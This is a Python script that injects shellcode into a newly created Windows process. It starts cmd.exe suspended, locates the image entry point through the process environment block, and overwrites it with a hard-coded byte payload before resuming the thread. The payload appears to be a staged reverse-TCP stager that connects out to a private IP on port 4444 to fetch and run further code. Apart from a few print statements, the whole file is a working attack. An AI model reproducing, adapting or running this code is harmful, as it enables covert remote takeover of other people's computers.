import ctypes
from ctypes import wintypes
from ctypes import *
import win32con
import struct


class STARTUPINFOA(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPSTR),
        ("lpDesktop", wintypes.LPSTR),
        ("lpTitle", wintypes.LPSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE)
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved1", c_void_p),
        ("PebAddress", c_void_p),
        ("Reserved2", c_void_p),
        ("Reserved3", c_void_p),
        ("UniquePid", c_void_p),
        ("MoreReserved", c_void_p)
    ]           


kernel32 = windll.kernel32
ntdll = windll.ntdll

CreateProcess = kernel32.CreateProcessA
CreateProcess.restype = c_int
CreateProcess.argtypes = [wintypes.LPCSTR, wintypes.LPSTR, c_void_p, c_void_p, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR, POINTER(STARTUPINFOA), POINTER(PROCESS_INFORMATION)]

ZwQueryInformationProcess = ntdll.ZwQueryInformationProcess
ZwQueryInformationProcess.restype = c_void_p
ZwQueryInformationProcess.argtypes = [wintypes.HANDLE, c_void_p, POINTER(PROCESS_BASIC_INFORMATION), c_ulong, POINTER(c_ulong)]

ReadProcessMemory = kernel32.ReadProcessMemory
ReadProcessMemory.restype = wintypes.BOOL
ReadProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID, c_size_t, POINTER(c_size_t)]

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.restype = wintypes.BOOL
WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, c_size_t, POINTER(c_size_t)]

ResumeThread = kernel32.ResumeThread
ResumeThread.restype = wintypes.DWORD
ResumeThread.argtypes = [wintypes.HANDLE]


si = STARTUPINFOA()
pi = PROCESS_INFORMATION()

command = "C:\\Windows\\System32\\cmd.exe"
command_line = ctypes.c_char_p(command.encode('utf-8'))

res = CreateProcess(None, command_line, None, None, False, win32con.CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi))

hProcess = pi.hProcess
bi = PROCESS_BASIC_INFORMATION()
tmp = c_ulong(0)

ZwQueryInformationProcess(hProcess, 0, ctypes.byref(bi), c_uint(ctypes.sizeof(c_void_p) * 6), ctypes.byref(tmp))

peb_address = bi.PebAddress
ptrToImageBase = ctypes.c_void_p(ctypes.c_int64(peb_address).value + 0x10)
addrBufSize = ctypes.sizeof(ctypes.c_void_p)
# Create addrBuf byte array
addrBuf = (ctypes.c_byte * addrBufSize)()
nRead = c_size_t(0)
ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, len(addrBuf), ctypes.byref(nRead))

svchostBase = c_void_p(struct.unpack("<q", addrBuf)[0])

buffer_size = 0x200
data = (c_byte * buffer_size)()

ReadProcessMemory(hProcess, svchostBase, ctypes.byref(data), len(data), ctypes.byref(nRead))
print(data)
data = bytes(data)
e_lfanew_offset = struct.unpack("<I", data[0x3c:0x3c+4])[0]
opthdr = e_lfanew_offset + 0x28;
entrypoint_rva = struct.unpack("<I", data[opthdr:opthdr+4])[0]

addressOfEntryPoint = c_void_p(entrypoint_rva + c_uint64(svchostBase.value).value)

payload =  b""
payload += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41"
payload += b"\x51\x41\x50\x52\x51\x48\x31\xd2\x65\x48\x8b"
payload += b"\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x56"
payload += b"\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48\x8b\x72"
payload += b"\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
payload += b"\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41"
payload += b"\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0"
payload += b"\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00"
payload += b"\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74"
payload += b"\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20"
payload += b"\x49\x01\xd0\x50\xe3\x56\x48\xff\xc9\x4d\x31"
payload += b"\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0"
payload += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75"
payload += b"\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
payload += b"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
payload += b"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b"
payload += b"\x04\x88\x41\x58\x41\x58\x5e\x59\x48\x01\xd0"
payload += b"\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20"
payload += b"\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12"
payload += b"\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32"
payload += b"\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48"
payload += b"\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc"
payload += b"\x02\x00\x11\x5c\xc0\xa8\x00\x14\x41\x54\x49"
payload += b"\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
payload += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59"
payload += b"\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41"
payload += b"\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff"
payload += b"\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
payload += b"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a"
payload += b"\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"
payload += b"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49"
payload += b"\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83"
payload += b"\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41"
payload += b"\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff"
payload += b"\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e"
payload += b"\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00"
payload += b"\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58"
payload += b"\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7"
payload += b"\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89"
payload += b"\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8"
payload += b"\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00"
payload += b"\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
payload += b"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61"
payload += b"\xff\xd5\x49\xff\xce\xe9\x3c\xff\xff\xff\x48"
payload += b"\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"
payload += b"\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5"
payload += b"\xa2\x56\xff\xd5"

WriteProcessMemory(hProcess, addressOfEntryPoint, payload, len(payload), ctypes.byref(nRead))
ResumeThread(pi.hThread)

if res != 0:
    print("Process created successfully.")
else:
    print("Failed to create process.")
